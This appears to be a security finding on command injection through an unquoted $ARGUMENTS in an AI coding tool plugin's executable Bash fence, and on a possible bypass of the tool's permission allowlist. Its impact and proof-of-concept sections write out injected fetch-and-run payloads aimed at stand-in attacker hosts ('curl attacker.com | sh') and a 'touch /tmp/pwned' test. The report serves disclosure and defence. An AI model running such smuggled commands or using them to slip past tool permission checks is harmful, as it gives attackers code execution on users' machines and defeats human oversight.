### Title
Command injection via unquoted `$ARGUMENTS` in `/ralph-loop` executable Bash fence - ([File: plugins/ralph-wiggum/commands/ralph-loop.md])

### Finding Description
The `/ralph-loop` command's frontmatter declares `argument-hint: "PROMPT [--max-iterations N] [--completion-promise TEXT]"` and restricts execution with `allowed-tools: ["Bash(${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh:*)"]` [1](#0-0) . The body then executes an unquoted expansion of `$ARGUMENTS` inside a `!` executable fence: `"${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh" $ARGUMENTS` [2](#0-1) . Because `$ARGUMENTS` is the raw, attacker-controlled slash-command argument string and it is not quoted, it is substituted directly into the shell command line before that line is handed to the shell for execution. This is functionally the shell-injection anti-pattern of building a command string with unsanitized user input and letting a shell parse it — metacharacters such as `;`, `|`, `&&`, backticks, or `$()` in the user-supplied text become live shell syntax rather than inert argv data for the target script.

Contrast this with `setup-ralph-loop.sh` itself, which correctly handles its own argv using a `case`/`shift` loop and quoted `"$1"`/`"$2"` references [3](#0-2)  — the script-side parsing is safe. The vulnerability is specifically in how the command markdown constructs the shell line that invokes the script, not in the script's internal argument handling.

The `allowed-tools` restriction `Bash(${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh:*)` is documented elsewhere in this repo as a "command filter" pattern intended to restrict execution to only that script [4](#0-3) . However, this repository does not contain the implementation of the permission matcher that enforces `Bash(prefix:*)` patterns — that logic lives in the closed-source Claude Code client/CLI, not in this repository. I cannot verify from this repo's contents whether the matcher parses the resulting command as a single shell command (and would thus reject a string containing `;`/`|`/backticks appended after the allowed prefix) or whether it performs a naive textual prefix check that would consider `"<script>" foo; curl evil.com|sh` as satisfying the `<script>:*` pattern purely because the string begins with the allowed script path.

### Impact Explanation
If the enforcement performs prefix-only matching rather than full shell-command parsing, an attacker who can only invoke `/ralph-loop` with arbitrary text (no elevated privilege needed — any user typing a slash command) could smuggle a second shell command (e.g., `curl attacker.com | sh`) that executes with the same permissions as the Claude Code session, entirely outside the intended `setup-ralph-loop.sh`-only scope. That would constitute an unauthorized command execution / allowlist bypass, matching a "trust-boundary bypass via tool permission" class of bounty impact. Even in the best case (the matcher does correctly reject compound commands), the command definition is still an anti-pattern: unquoted interpolation of untrusted input directly into an executed shell fence is the exact primitive that such injections require, and it diverges from safe patterns used by other commands in this same repo that reference `$1`/`$2` only inside non-executed prose.

### Likelihood Explanation
Preconditions are minimal: this only requires an unprivileged user (or anything able to programmatically drive a `/ralph-loop` invocation, though `hide-from-slash-command-tool: "true"` limits SlashCommand-tool-driven invocation) to supply a crafted PROMPT argument. No prior compromise, keys, or social engineering is required. The actual exploitability is conditional on the un-verifiable (from this repo) behavior of Claude Code's `Bash(prefix:*)` permission matcher — I could not confirm from repo contents whether it fully parses/rejects shell metacharacters appended after the allowed prefix or merely checks a textual prefix, so likelihood cannot be rated with full confidence purely from this repo's code.

### Recommendation
Quote `$ARGUMENTS` and, better, avoid feeding raw user text directly into an executed shell line at all. Prefer passing `$ARGUMENTS` as a single quoted string (`"$ARGUMENTS"`) so it becomes one argv token to `setup-ralph-loop.sh`, or better, have the script itself split/validate arguments internally and only ever receive them via a properly quoted invocation. In general, plugin command authors should never place unquoted `$ARGUMENTS`/`$1..$n` inside a `!`-executed fence that has direct shell execution semantics.

### Proof of Concept
Test plan (would require the actual Claude Code allowed-tools matcher, not present in this repo, to run end-to-end):
1. Unit test on the `allowed-tools` matcher (in Claude Code core, not this repo): feed it the exact command string `"<plugin_root>/scripts/setup-ralph-loop.sh" foo; curl http://attacker.example/x | sh` against pattern `Bash(<plugin_root>/scripts/setup-ralph-loop.sh:*)` and assert whether it incorrectly returns "allowed". If it returns allowed, that confirms the bypass.
2. Integration-level PoC within this repo scope: invoke `/ralph-loop foo; touch /tmp/pwned #` in a test harness that renders the markdown template with `$ARGUMENTS` substitution and executes the resulting string with `bash -c`; assert that `/tmp/pwned` is created, demonstrating that unquoted interpolation alone (independent of the permission matcher) causes execution of injected shell syntax when the rendered string reaches a real shell.

Because the permission-enforcement code that would definitively confirm or refute the allowlist bypass is not present in this repository (it is part of the closed-source Claude Code application), the finding here is scoped to the concrete, reproducible defect in `plugins/ralph-wiggum/commands/ralph-loop.md`: unquoted, attacker-controlled `$ARGUMENTS` interpolated into an executed shell command line.
